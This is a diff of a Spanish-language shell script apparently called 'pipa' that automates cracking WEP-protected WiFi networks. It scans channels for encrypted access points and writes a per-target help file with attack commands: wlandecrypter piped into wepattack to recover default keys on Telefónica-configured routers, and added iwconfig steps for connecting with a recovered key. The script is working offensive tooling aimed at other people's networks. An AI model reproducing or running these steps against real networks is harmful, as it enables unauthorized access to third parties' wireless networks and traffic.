@@ -178,7 +178,11 @@ then
 	exit
 fi
 
-# TODO : Hacer un command not found que saque la ayuda
+if [ "$1" != "" ]
+then
+	echo "Comando no encontrado, prueba pipa help"
+	exit
+fi
 
 IfaceStaMode
 
@@ -191,8 +195,9 @@ echo -n "Escaneando y guardando config :"
 CHANNEL_AUX=1
 for CHANNEL_AUX in $CHANNEL_LIST
 do
-	IfaceChannelChange ath0 $CHANNEL_AUX
-	
+	# TODO: no funciona en modo station, aun con esas dejamos el echo que queda mu cuul
+	# IfaceChannelChange ath0 $CHANNEL_AUX
+	# 
 	echo; echo -n "[channel $CHANNEL_AUX] "
 	
 	IWLIST_DATA=`iwlist ath0 scan | grep "Address\|ESSID\|Channel\|WPA\|Mode\|Encryption" | tr "\n" " " | sed -e "s/Cell/\nCell/g" | grep "Mode:Master" | grep "Encryption key:on" | sed -e "s/Mode:Master//g" -e "s/Encryption key:on//g" | sed -e "s/Frequency:2.....GHz//p" | sort | uniq | sed -e "s/ESSID/ ESSID/g" | sed -e "s/Cell...//g" | grep -v WPA | sed -e "s/(/ /g" -e "s/)/ /g" -e "s/Channel/Channel:/g" | sed -e "s/^ - //g" -e "s/ *ESSID/ ESSID/g" -e "s/\" *Channel: /\" Channel:/g" -e "s/Address: /Address:/g"`
@@ -270,6 +275,10 @@ do
 		echo "# una vez que tengamos datos ejecutamos : " >> "$DIRWIFI/ayuda.txt"
 		echo "wlandecrypter $BSSID $ESSID | wepattack -f *.cap" >> "$DIRWIFI/ayuda.txt"
 		echo "# de tener el ap configurado por timofonica tendras la clave en un segundo" >> "$DIRWIFI/ayuda.txt"
+
+		echo "# N998) Para probrar la config a pelo :" >> "$DIRWIFI/ayuda.txt"
+		echo "pipa reset-iface" >> "$DIRWIFI/ayuda.txt"
+		echo "iwconfig ath0 essid \"$ESSID\" key s:[CLAVE]" >> "$DIRWIFI/ayuda.txt"
 		echo "# N999) Para una version abreviada de este documento sin los comentarios ejecutar :" >> "$DIRWIFI/ayuda.txt"
 		echo "grep -v \"#\" ayuda.txt" >> "$DIRWIFI/ayuda.txt"
 	done
